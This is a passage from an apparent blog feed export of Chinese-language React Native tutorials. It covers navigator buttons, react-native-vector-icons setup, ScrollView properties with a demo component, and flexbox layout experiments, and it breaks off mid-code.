=&gt; {if (index &gt; 0) {navigator.pop()}}}&gt; &lt;Text style={styles.leftNavButtonText}&gt; 后退 &lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;/View&gt; ); } else { return null; } }, 右键RightButton: 点击调用路由(route)的onPress()方法, 提示信息. 根据路由的rightText属性添加显示文字. // 右键 RightButton(route, navigator, index, navState) { if (route.onPress) return ( &lt;View style={styles.navContainer}&gt; &lt;TouchableOpacity onPress={() =&gt; route.onPress()}&gt; &lt;Text style={styles.rightNavButtonText}&gt; {route.rightText || &apos;右键&apos;} &lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;/View&gt; ); }, 第一页/第二页第一页与第二页与上文类似, 当第一页跳转时, 传递的路由信息有些变化, 控制第二页与导航栏的显示信息. // 填出提示框 onPress() { alert(&quot;我是Spike!&quot;); } /** * 跳转页面至SecondPage * @param name 传递参数 * @param type 动画类型 */ gotoNext(name, type = &apos;Normal&apos;) { this.props.navigator.push({ component: SecondPage, passProps: { id: name }, onPress: this.onPress, rightText: &apos;ALERT!&apos;, type: type }) } React Native 路由的基本功能就是这些, 控制页面的切换, 控制导航栏的功能. 导航栏作为应用最重要的组件之一, 一定要熟练掌握.OK, that’s all ! Enjoy it!转自：http://www.jianshu.com/p/91fa0f34895e]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[react-native-vector-icons的简单使用,图片,按钮,标签视图,导航条🌀]]></title>
      <url>%2F2016%2F05%2F12%2F28%2F</url>
      <content type="text"><![CDATA[ICONS是可以直接使用图片名, 就能加载图片的三方,使用很方便, 你不需要在工程文件夹里塞各种图片, 节省很多空间,下面就来看看怎么使用吧! 首先打开terminal进入到我们的工程文件夹下, (不会创建工程的请参考:http://blog.csdn.net/margaret_mo/article/details/51304062)输入: npm install react-native-vector-icons –save (回车)输入: npm install rnpm -g输入: rnpm link (回车) 在Finder中用Xcode打开工程: …/Demo/ios/Demo.xcodeproj(1).右键工程文件Add Files to “(你工程名)”(2).选择node_modules/react-native-vector-icons/Fonts文件(3).点击”完成”. 在xcode的Info.plist文件中,加入: Fonts provided by application数组,并加入以下9项:到此环境就算设置好了, 接下来就是使用ICONS了. 在Finder中右键用Atom打开工程:5.然后就开始编辑我们的程序了: ‘use strict’; import React, { AppRegistry, Component, View, StyleSheet, AlertIOS, Text, TabBarIOS, NavigatorIOS, } from ‘react-native’; var Icon = require(‘react-native-vector-icons/FontAwesome’); import FindComponent from ‘./FindComponent’; import SearchComponent from ‘./SearchComponent’; class Demo extends Component { state = { selectedTab: &apos;find&apos;, }; loginWithFacebook = () =&gt; { //点击&quot;Login with Facebook&quot;按钮后触发的方法 AlertIOS.alert(&quot;facebook&quot;); } render() { return ( &lt;View style={styles.container}&gt; &lt;Icon name=&quot;rocket&quot; //图片名连接,可以到这个网址搜索:http://ionicons.com/, 使用时:去掉前面的 &quot;icon-&quot; !!!! size={30} //图片大小 color=&quot;red&quot; //图片颜色 /&gt; &lt;Icon.Button //在图片后加文字 name=&quot;facebook&quot; backgroundColor=&quot;#3b5998&quot; onPress={this.loginWithFacebook} //点击该按钮后触发的方法 &gt; Login with Facebook &lt;/Icon.Button&gt; &lt;Icon.Button //在图片后加, 自定义样式的文字 name=&quot;facebook&quot; backgroundColor=&quot;#3b5998&quot;&gt; &lt;Text style={{fontFamily: 'Arial', fontSize: 15}}&gt;Login with Facebook&lt;/Text&gt; &lt;/Icon.Button&gt; &lt;TabBarIOS //和标签视图一起使用 tintColor=&quot;#4977f0&quot; barTintColor=&quot;#E6E6E6&quot;&gt; &lt;Icon.TabBarItem //用 Icon.TabBarItem 代替 TabBarIOS.Item title=&quot;发现&quot; iconName=&quot;home&quot; selectedIconName=&quot;home&quot; selected = {this.state.selectedTab === &apos;find&apos;} onPress={() =&gt; { this.setState({ selectedTab: &apos;find&apos;, }); }}&gt; &lt;NavigatorIOS //导航栏 style={styles.container} tintColor=&apos;#FFFFFF&apos; barTintColor=&apos;#4977f0&apos; initialRoute={{ title: "发现", titleTextColor: 'white', component: FindComponent }}/&gt; &lt;/Icon.TabBarItem&gt; &lt;Icon.TabBarItem //用 Icon.TabBarItem 代替 TabBarIOS.Item title=&quot;搜索&quot; iconName=&quot;search&quot; selectedIconName=&quot;search&quot; selected = {this.state.selectedTab === &apos;search&apos;} onPress={() =&gt; { this.setState({ selectedTab: &apos;search&apos;, }); }}&gt; &lt;NavigatorIOS style={styles.container} tintColor=&apos;#FFFFFF&apos; barTintColor=&apos;#4977f0&apos; initialRoute={{ title: "搜索", titleTextColor: 'white', component: SearchComponent }}/&gt; &lt;/Icon.TabBarItem&gt; &lt;/TabBarIOS&gt; &lt;/View&gt; ); } } const styles = StyleSheet.create({ container: { flex: 1, justifyContent: &apos;center&apos;, }, }); AppRegistry.registerComponent(&apos;Demo&apos;, () =&gt; Demo); 在terminal中的工程文件夹下,输入react-native run-ios(回车)等待程序运行起来就能看到效果啦.主要代码下载地址: http://download.csdn.net/detail/margaret_mo/9512769参考网站: https://github.com/oblador/react-native-vector-icons转自：http://www.cnblogs.com/moxiaoyan33/p/5482024.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[React Native 之 ScrollView 的详解🐯]]></title>
      <url>%2F2016%2F05%2F04%2F27%2F</url>
      <content type="text"><![CDATA[原文&lt; http://godcoder.me/2016/10/05/reactnative-scrollview/&gt; 大家好，我是ScrollView，相信做过移动或者前端开发的人肯定都很熟悉我，对，我就是那个可以滚动的容器，滚有点难听，我是可以滑动的容器，我滑动起来，摩擦摩擦，似魔鬼的步伐。我不仅可以上下滚动，就是垂直，还可以左右滚动，这叫有水平。我厉不厉害？我这个人，为人心胸宽广，可以包容很多东西，我这叫宰相肚子里能撑船，什么组件，什么视图都可以放进来，主要是本人太饿了，啥都喜欢吃。这就是我的自我介绍。 关于我，我还想说，我这个人身上笑点比较低，随便一触摸就想笑，当然，你们摸我，让我干什么事，我还是很听话的，唯独有一点就是你们别想让我滚，让我滚是有条件的，条件就是必须让我吃饱，吃撑了才可以，这样我才有力气滚动（视图高度一定才可以滚动）。要么设置我的身高是固定的，当然我想长高，所以不建议这么做，要么就是设置我上级的高度，当然要这样做，不要忘了设置flex:1,要不然一样没用。 我的性格来看看我有哪些性格特点，只有知道了我的性格特点，才更能容易了解我，针对我，容易控制我啊，如果你不了解我，就想让我帮你干活？做梦去吧。 contentContainerStyle 这个样式会应用到一个内层的内容容器上，所有的子视图都会包裹在内容容器内。 horizontal 如果设为true，意思是我吃的东西都是左右，在水平方向上排列的，貌似不太容易消化（玩笑），默认false，当然是垂直方向了。 keyboardDismissMode enum(‘none’, ‘interactive’, ‘on-drag’) 当我滚动的时候，是否隐藏键盘 none（默认值），拖拽时不隐藏软键盘。 on-drag 当拖拽开始的时候隐藏软键盘。 interactive 软键盘伴随拖拽操作同步地消失，并且如果往上滑动会恢复键盘。安卓设备上不支持这个选项，会表现的和none一样。 keyboardShouldPersistTaps 当此属性为false的时候，在软键盘激活之后，点击焦点文本输入框以外的地方，键盘就会隐藏。如果为true，滚动视图不会响应点击操作，并且键盘不会自动消失。默认值为false。 onContentSizeChange function 该函数方法会在ScrollView内部可滚动内容的视图发生变化时调用。 onScroll function 在滚动的过程中，每帧最多调用一次此回调函数。调用的频率可以用scrollEventThrottle属性来控制。 pagingEnabled 如果为true，滚动视图的滚动视图大小的倍数滚动时停止。这可用于水平分页。默认值false。 refreshControl 告诉RefreshControl组件，为我供下拉刷新功能。 removeClippedSubviews （实验属性） 当为true的时候。在ScrollView视图之外的视图(该视图的overflow属性值必须要为hidden)会从被暂时移除，该设置可以提高滚动的性能。 scrollEnabled 为false时，内容视图不可以滚动，默认值true。 showsHorizontalScrollIndicator 当为true时，显示水平滚动条 showsVerticalScrollIndicator 与上面正好相反。 我的穿衣打扮来，一起来看看，我有哪些外在的服饰和化妆品，可以使用更佳美观和漂亮，修饰我的内在和外在。 backfaceVisibility ([‘visible’, ‘hidden’]) 显示还是隐藏 backgroundColor color 背景色 borderBottomColor color 底部边框颜色 borderBottomLeftRadius number 左下角圆角大小 borderBottomRightRadius 自己翻译（与上同理） borderBottomWidth 底部边框宽度 borderColor color 边框颜色 borderLeftColor color borderLeftWidth number 同理 borderRadius number 四周圆角大小 borderRightColor color borderRightWidth number borderStyle （[’solid’, ‘dotted’, ‘dashed’]) 边框的样式，是实现，还是点，还是虚线 borderTopColor color borderTopLeftRadius number borderTopRightRadius number borderTopWidth number borderWidth number 边框宽度 opacity number 设置透明度 overflow ([‘visible’, ‘hidden’]) androidelevation number android5.0以上有的，立体阴影效果 我只介绍了以上常用的的风格，还有几个和android相关，还有很多与ios相关的属性，我就不再介绍了，自己去官方文档查查吧。地址：https://facebook.github.io/react-native/docs/scrollview.html我的秀丽身材闻其声不见其人，光知道我，没见过我岂不是很out？像我这么美的人，你们不用我，是不是有点那个啥？哈哈……魔鬼样子逻辑实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276import React, &#123; Component &#125; from &apos;react&apos;;import &#123; AppRegistry, StyleSheet, Text, View, Image, ScrollView, TouchableOpacity,&#125; from &apos;react-native&apos;;class ImageDemo extends Component &#123; render() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;View style=&#123;styles.title_view&#125;&gt; &lt;Text style=&#123;styles.title_text&#125;&gt; 空间动态 &lt;/Text&gt; &lt;/View&gt; &lt;ScrollView ref=&#123;(scrollView) =&gt; &#123; _scrollView = scrollView; &#125;&#125;&gt; &lt;View style=&#123;styles.three_image_view&#125;&gt; &lt;View style=&#123;styles.vertical_view&#125;&gt; &lt;Image source=&#123;require(&apos;./img/igs.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:45,height:45&#125;&#125; /&gt; &lt;Text style=&#123;styles.top_text&#125;&gt; 好友动态 &lt;/Text&gt; &lt;/View&gt; &lt;View style=&#123;styles.vertical_view&#125;&gt; &lt;Image source=&#123;require(&apos;./img/eqc.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:45,height:45&#125;&#125;/&gt; &lt;Text style=&#123;styles.top_text&#125;&gt; 附近 &lt;/Text&gt; &lt;/View&gt; &lt;View style=&#123;styles.vertical_view&#125;&gt; &lt;Image source=&#123;require(&apos;./img/iei.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:45,height:45&#125;&#125;/&gt; &lt;Text style=&#123;styles.top_text&#125; &gt; 兴趣部落 &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style=&#123;&#123;height:30,backgroundColor:&apos;#f9f9fb&apos;&#125;&#125;/&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsa.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 羽毛球 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsb.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 火车票 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nrz.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 视频 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsa.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 羽毛球 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsb.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 火车票 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nrz.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 视频 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsa.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 羽毛球 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsb.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 火车票 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nrz.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 视频 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsa.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 羽毛球 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsb.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 火车票 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nrz.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 视频 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsa.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 羽毛球 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsb.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 火车票 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nrz.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 视频 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsa.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 羽毛球 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nsb.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 火车票 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;View style=&#123;styles.rectangle_view&#125;&gt; &lt;View style=&#123;&#123;flexDirection:&apos;row&apos;,alignItems: &apos;center&apos;&#125;&#125;&gt; &lt;Image source=&#123;require(&apos;./img/nrz.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:30,height:30&#125;&#125;/&gt; &lt;Text style=&#123;styles.rectangle_text&#125; &gt; 视频 &lt;/Text&gt; &lt;/View&gt; &lt;Image source=&#123;require(&apos;./img/ppe.png&apos;)&#125; style=&#123;&#123;alignSelf:&apos;center&apos;,width:20,height:20&#125;&#125;/&gt; &lt;/View&gt; &lt;/ScrollView&gt; &lt;TouchableOpacity style=&#123;styles.button&#125; onPress=&#123;() =&gt; &#123; _scrollView.scrollTo(&#123;y: 0&#125;); &#125;&#125;&gt; &lt;Text&gt;让我滚回去&lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, backgroundColor: &apos;white&apos;, &#125;, title_view:&#123; flexDirection:&apos;row&apos;, height:50, justifyContent: &apos;center&apos;, alignItems: &apos;center&apos;, backgroundColor:&apos;#27b5ee&apos;, &#125;, title_text:&#123; color:&apos;white&apos;, fontSize:20, textAlign:&apos;center&apos; &#125;, three_image_view:&#123; paddingTop: 15, flexDirection:&apos;row&apos;, justifyContent: &apos;space-around&apos;, alignItems: &apos;center&apos;, backgroundColor:&apos;white&apos;, &#125;, vertical_view:&#123; justifyContent: &apos;center&apos;, alignItems: &apos;center&apos;, backgroundColor:&apos;white&apos;, paddingBottom:15, &#125;, top_text:&#123; marginTop:5, color:&apos;black&apos;, fontSize:16, textAlign:&apos;center&apos; &#125;, rectangle_view:&#123; paddingTop:8, paddingBottom:8, paddingLeft:15, paddingRight:15, flexDirection:&apos;row&apos;, justifyContent: &apos;space-between&apos;, alignItems: &apos;center&apos;, backgroundColor:&apos;white&apos;, borderBottomColor:&apos;#dedfe0&apos;, borderBottomWidth:1, &#125;, rectangle_text:&#123; color:&apos;black&apos;, fontSize:16, textAlign:&apos;center&apos;, paddingLeft:8, &#125;, button: &#123; margin: 7, padding: 5, alignItems: &apos;center&apos;, backgroundColor: &apos;#eaeaea&apos;, borderRadius: 3, &#125;,&#125;);AppRegistry.registerComponent(&apos;ImageDemo&apos;, () =&gt; ImageDemo); ok,到这里ScrollView就讲完了，由于非常简单，大家赶紧去练练手吧！不懂的可以在下面留言，由于我也是第一次学，欢迎大家提出不足，一起交流学习。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ReactNative探索（二）：布局篇🍟]]></title>
      <url>%2F2016%2F05%2F02%2F26%2F</url>
      <content type="text"><![CDATA[宽度单位和像素密度react的宽度不支持百分比，设置宽度时不需要带单位 {width: 10}， 那么10代表的具体宽度是多少呢？不知道是官网文档不全还是我眼瞎，反正是没找到，那做一个实验自己找吧： var Dimensions = require(&apos;Dimensions&apos;); &lt;Text style={styles.welcome}&gt; window.width={Dimensions.get(&apos;window&apos;).width + &apos;\n&apos;} window.height={Dimensions.get(&apos;window&apos;).height + &apos;\n&apos;} pxielRatio={PixelRatio.get()} &lt;/Text&gt; 默认用的是iphone6的模拟器结果是： window.width=375 window.height=667 pxielRatio=2 我们知道iphone系列的尺寸如下图：可以看到iphone 6的宽度为 375pt，对应了上边的375，由此可见react的单位为pt。 那如何获取实际的像素尺寸呢？ 这对图片的高清化很重要，如果我的图片大小为100100 px. 设置宽度为100 100. 那在iphone上的尺寸就是模糊的。 这个时候需要的图像大小应该是 100 * pixelRatio的大小 。react 提供了PixelRatio 的获取方式https://facebook.github.io/react-native/docs/pixelratio.html var image = getImage({ width: 200 * PixelRatio.get(), height: 100 * PixelRatio.get() }); &lt;Image source={image} style={{width: 200, height: 100}} /&gt; flex的布局默认宽度我们知道一个div如果不设置宽度，默认的会占用100%的宽度， 为了验证100%这个问题， 做三个实验 1.根节点上方一个View， 不设置宽度2.固定宽度的元素上设置一个View， 不设置宽度3.flex的元素上放一个View宽度， 不设置宽度 &lt;Text style={[styles.text, styles.header]}&gt; 根节点上放一个元素，不设置宽度 &lt;/Text&gt; &lt;View style={{height: 20, backgroundColor: '#333333'}} /&gt; &lt;Text style={[styles.text, styles.header]}&gt; 固定宽度的元素上放一个View，不设置宽度 &lt;/Text&gt; &lt;View style={{width: 100}}&gt; &lt;View style={{height: 20, backgroundColor: '#333333'}} /&gt; &lt;/View&gt; &lt;Text style={[styles.text, styles.header]}&gt; flex的元素上放一个View，不设置宽度 &lt;/Text&gt; &lt;View style={{flexDirection: 'row'}}&gt; &lt;View style={{flex: 1}}&gt; &lt;View style={{height: 20, backgroundColor: '#333333'}} /&gt; &lt;/View&gt; &lt;View style={{flex: 1}}/&gt; &lt;/View&gt; 结果可以看到flex的元素如果不设置宽度， 都会百分之百的占满父容器。 水平垂直居中css 里边经常会做的事情是去讲一个文本或者图片水平垂直居中，如果使用过css 的flexbox当然知道使用alignItems 和 justifyContent . 那用react-native也来做一下实验 &lt;Text style={[styles.text, styles.header]}&gt; 水平居中 &lt;/Text&gt; &lt;View style={{height: 100, backgroundColor: '#333333', alignItems: 'center'}}&gt; &lt;View style={{backgroundColor: '#fefefe', width: 30, height: 30, borderRadius: 15}}/&gt; &lt;/View&gt; &lt;Text style={[styles.text, styles.header]}&gt; 垂直居中 &lt;/Text&gt; &lt;View style={{height: 100, backgroundColor: '#333333', justifyContent: 'center'}}&gt; &lt;View style={{backgroundColor: '#fefefe', width: 30, height: 30, borderRadius: 15}}/&gt; &lt;/View&gt; &lt;Text style={[styles.text, styles.header]}&gt; 水平垂直居中 &lt;/Text&gt; &lt;View style={{height: 100, backgroundColor: '#333333', alignItems: 'center', justifyContent: 'center'}}&gt; &lt;View style={{backgroundColor: '#fefefe', width: 30, height: 30, borderRadius: 15}}/&gt; &lt;/View&gt; 网格布局网格布局实验， 网格布局能够满足绝大多数的日常开发需求，所以只要满足网格布局的spec，那么就可以证明react的flex布局能够满足正常开发需求 等分的网格 &lt;View style={styles.flexContainer}&gt; &lt;View style={styles.cell}&gt; &lt;Text style={styles.welcome}&gt; cell1 &lt;/Text&gt; &lt;/View&gt; &lt;View style={styles.cell}&gt; &lt;Text style={styles.welcome}&gt; cell2 &lt;/Text&gt; &lt;/View&gt; &lt;View style={styles.cell}&gt; &lt;Text style={styles.welcome}&gt; cell3 &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; styles = { flexContainer: { // 容器需要添加direction才能变成让子元素flex flexDirection: &apos;row&apos; }, cell: { flex: 1, height: 50, backgroundColor: &apos;#aaaaaa&apos; }, welcome: { fontSize: 20, textAlign: &apos;center&apos;, margin: 10 }, } 左边固定， 右边固定，中间flex的布局 &lt;View style={styles.flexContainer}&gt; &lt;View style={styles.cellfixed}&gt; &lt;Text style={styles.welcome}&gt; fixed &lt;/Text&gt; &lt;/View&gt; &lt;View style={styles.cell}&gt; &lt;Text style={styles.welcome}&gt; flex &lt;/Text&gt; &lt;/View&gt; &lt;View style={styles.cellfixed}&gt; &lt;Text style={styles.welcome}&gt; fixed &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; styles = { flexContainer: { // 容器需要添加direction才能变成让子元素flex flexDirection: &apos;row&apos; }, cell: { flex: 1, height: 50, backgroundColor: &apos;#aaaaaa&apos; }, welcome: { fontSize: 20, textAlign: &apos;center&apos;, margin: 10 }, cellfixed: { height: 50, width: 80, backgroundColor: &apos;#fefefe&apos; } } 嵌套的网格通常网格不是一层的，布局容器都是一层套一层的， 所以必须验证在real world下面的网格布局 &lt;Text style={[styles.text, styles.header]}&gt; 嵌套的网格 &lt;/Text&gt; &lt;View style={{flexDirection: 'row', height: 200, backgroundColor:"#fefefe", padding: 20}}&gt; &lt;View style={{flex: 1, flexDirection:'column', padding: 15, backgroundColor:"#eeeeee"}}&gt; &lt;View style={{flex: 1, backgroundColor:"#bbaaaa"}}&gt; &lt;/View&gt; &lt;View style={{flex: 1, backgroundColor:"#aabbaa"}}&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={{flex: 1, padding: 15, flexDirection:'row', backgroundColor:"#eeeeee"}}&gt; &lt;View style={{flex: 1, 